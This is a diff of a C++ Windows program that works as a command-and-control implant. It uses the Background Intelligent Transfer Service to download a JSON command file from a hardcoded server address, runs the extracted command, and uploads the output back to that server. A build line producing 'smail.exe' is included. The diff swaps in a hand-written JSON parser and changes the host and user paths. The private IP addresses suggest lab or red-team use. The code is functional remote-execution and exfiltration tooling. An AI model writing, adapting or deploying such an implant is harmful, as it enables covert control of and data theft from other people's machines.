@@ -3,31 +3,70 @@
 #include <iostream>
 #include <fstream>
 #include <string>
-#include "json.hpp" // Include nlohmann JSON library
 
-using json = nlohmann::json; // Alias for convenience
+#define COMMAND_URL L"http://192.168.16.130/commands/command.json"
+#define UPLOAD_URL L"http://192.168.16.130/uploads/response.txt"
+#define LOCAL_COMMAND_FILE "C:\\Users\\Administrator\\Desktop\\command.json"
+#define LOCAL_RESULT_FILE "C:\\Users\\Administrator\\Desktop\\response.txt"
 
-#define COMMAND_URL L"http://192.168.12.128/commands/command.json"
-#define UPLOAD_URL L"http://192.168.12.128/uploads/response.txt"
-#define LOCAL_COMMAND_FILE "C:\\Users\\smail\\Desktop\\command.json"
-#define LOCAL_RESULT_FILE "C:\\Users\\smail\\Desktop\\response.txt"
+// Function to extract the "command" key from a JSON string
+std::string extractCommandFromJson(const std::string& json) {
+    size_t start = json.find("\"command\"");
+    if (start == std::string::npos) {
+        std::cerr << "[-] Key 'command' not found in JSON." << std::endl;
+        return "";
+    }
 
+    start = json.find(":", start);
+    if (start == std::string::npos) {
+        std::cerr << "[-] Malformed JSON, no ':' found for key 'command'." << std::endl;
+        return "";
+    }
+
+    start = json.find("\"", start) + 1; // Find the opening quote of the value
+    size_t end = json.find("\"", start); // Find the closing quote of the value
+
+    if (start == std::string::npos || end == std::string::npos) {
+        std::cerr << "[-] Malformed JSON, value not properly quoted." << std::endl;
+        return "";
+    }
+
+    return json.substr(start, end - start); // Extract the value
+}
+
+// Function to read the command from a file
+std::string readCommandFromFile(const std::string& filePath) {
+    std::ifstream file(filePath);
+    if (!file.is_open()) {
+        std::cerr << "[-] Failed to open command file." << std::endl;
+        return "";
+    }
+
+    std::string jsonContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+    file.close();
+
+    return extractCommandFromJson(jsonContent);
+}
+
+// Initialize COM
 HRESULT InitializeCOM() {
     return CoInitializeEx(NULL, COINIT_MULTITHREADED);
 }
 
+// Create BITS manager
 HRESULT CreateBITSManager(IBackgroundCopyManager** pManager) {
     return CoCreateInstance(__uuidof(BackgroundCopyManager), NULL, CLSCTX_LOCAL_SERVER,
                             __uuidof(IBackgroundCopyManager), (void**)pManager);
 }
 
+// Download file using BITS
 HRESULT DownloadFile(IBackgroundCopyManager* pManager) {
     IBackgroundCopyJob* pJob = NULL;
     GUID jobId;
 
     HRESULT hr = pManager->CreateJob(L"DownloadJob", BG_JOB_TYPE_DOWNLOAD, &jobId, &pJob);
     if (SUCCEEDED(hr)) {
-        pJob->AddFile(COMMAND_URL, L"C:\\Users\\smail\\Desktop\\command.json");
+        pJob->AddFile(COMMAND_URL, L"C:\\Users\\Administrator\\Desktop\\command.json");
         pJob->Resume();
 
         BG_JOB_STATE state;
@@ -49,13 +88,14 @@ HRESULT DownloadFile(IBackgroundCopyManager* pManager) {
     return hr;
 }
 
+// Upload file using BITS
 HRESULT UploadFile(IBackgroundCopyManager* pManager) {
     IBackgroundCopyJob* pJob = NULL;
     GUID jobId;
 
     HRESULT hr = pManager->CreateJob(L"UploadJob", BG_JOB_TYPE_UPLOAD, &jobId, &pJob);
     if (SUCCEEDED(hr)) {
-        hr = pJob->AddFile(UPLOAD_URL, L"C:\\Users\\smail\\Desktop\\response.txt");
+        hr = pJob->AddFile(UPLOAD_URL, L"C:\\Users\\Administrator\\Desktop\\response.txt");
         if (FAILED(hr)) {
             std::cerr << "[-] Failed to add file to upload job. HRESULT: " << hr << std::endl;
             pJob->Release();
@@ -93,26 +133,7 @@ HRESULT UploadFile(IBackgroundCopyManager* pManager) {
     return hr;
 }
 
-std::string readCommandFromFile(const std::string& filePath) {
-    std::ifstream file(filePath);
-    if (!file.is_open()) {
-        std::cerr << "[-] Failed to open command file." << std::endl;
-        return "";
-    }
-
-    try {
-        json commandJson;
-        file >> commandJson; // Parse JSON content
-        file.close();
-
-        return commandJson["command"].get<std::string>(); // Extract the "command" key
-    } catch (const std::exception& e) {
-        std::cerr << "[-] Error parsing JSON: " << e.what() << std::endl;
-        file.close();
-        return "";
-    }
-}
-
+// Execute the command
 void executeCommand(const std::string& command) {
     if (command.empty()) {
         std::cerr << "[-] No command to execute." << std::endl;
@@ -133,6 +154,7 @@ void executeCommand(const std::string& command) {
     }
 }
 
+// Main function
 int main() {
     HRESULT hr;
     IBackgroundCopyManager* pManager = NULL;
@@ -168,3 +190,5 @@ int main() {
 
     return 0;
 }
+
+// clang++ -o smail.exe smail.cpp -lole32 -lws2_32 -lruntimeobject -luuid
